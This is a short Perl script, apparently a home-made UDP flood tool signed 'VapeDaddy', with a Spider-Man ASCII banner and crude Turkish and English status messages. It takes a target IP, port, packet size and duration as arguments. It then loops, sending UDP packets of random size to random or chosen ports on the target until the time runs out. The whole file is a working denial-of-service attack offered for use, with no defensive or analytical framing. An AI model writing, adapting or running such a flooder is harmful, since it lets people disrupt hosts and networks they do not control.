#!/usr/bin/perl

use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;

##
# VapeDaddy 
##

use Socket;
use strict;

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print BOLD RED<<EOTEXT;
                    Spider
                     Man
               
                   :-,__-;
                  ;  _    :                    
                 :  / \   /;                   
                 ; :   \ / :                   
                 : ;_.-' `.;                   
                  \       /                    
                   `.___.'
EOTEXT

print "Spider Man $ip ipsini Pingliyor! " . ($port ? $port : "Sucking The Clit") . " Portunu " . 
  ($size ? "$size-Slammed" : "65500") . "Botla pingliyor" . 
  ($time ? " for $time seconds" : "") . "\n";
print "Durdurmak için ctrl+c\n" unless $time;
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}
